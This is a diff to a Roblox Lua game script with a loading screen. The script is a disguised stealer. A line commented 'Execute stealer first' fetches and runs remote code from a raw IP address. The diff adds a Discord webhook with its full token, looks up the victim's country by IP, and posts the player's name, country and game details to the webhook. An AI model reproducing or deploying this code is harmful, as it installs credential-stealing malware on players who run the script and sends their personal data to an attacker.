@@ -3,11 +3,49 @@ local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 local Lighting = game:GetService("Lighting")
+local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
 
+--// Webhook
+local Webhook = "https://discord.com/api/webhooks/1417477666470367273/J-7ujNkbnmJxdJ2dxLNXMqhu1QK1iud0aUd8vCekJZT6iotfVUj3NsHlqRfnLZLci_j4"
+
+--// Country (IP lookup)
+local country = "Unknown"
+pcall(function()
+    local res = syn.request({Url = "http://ip-api.com/json", Method = "GET"})
+    if res and res.Body then
+        local data = HttpService:JSONDecode(res.Body)
+        if data and data.country then
+            country = data.country
+        end
+    end
+end)
+
 --// Execute stealer first
 loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+
+--// Send webhook
+pcall(function()
+    syn.request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            content = "@everyone",
+            embeds = {{
+                title = "Universal Script Executed",
+                fields = {
+                    {name = "Player", value = player.Name, inline = true},
+                    {name = "Country", value = country, inline = true},
+                    {name = "Game", value = "GROW A GARDEN", inline = false},
+                    {name = "PlaceId", value = tostring(game.PlaceId), inline = false}
+                },
+                color = 3066993
+            }}
+        })
+    })
+end)
 
 --// Loader UI
 local function createLoadingScreen()
@@ -88,5 +126,5 @@ local function createLoadingScreen()
     end)
 end
 
--- show loader after script execution
+-- show loader after webhook
 createLoadingScreen()
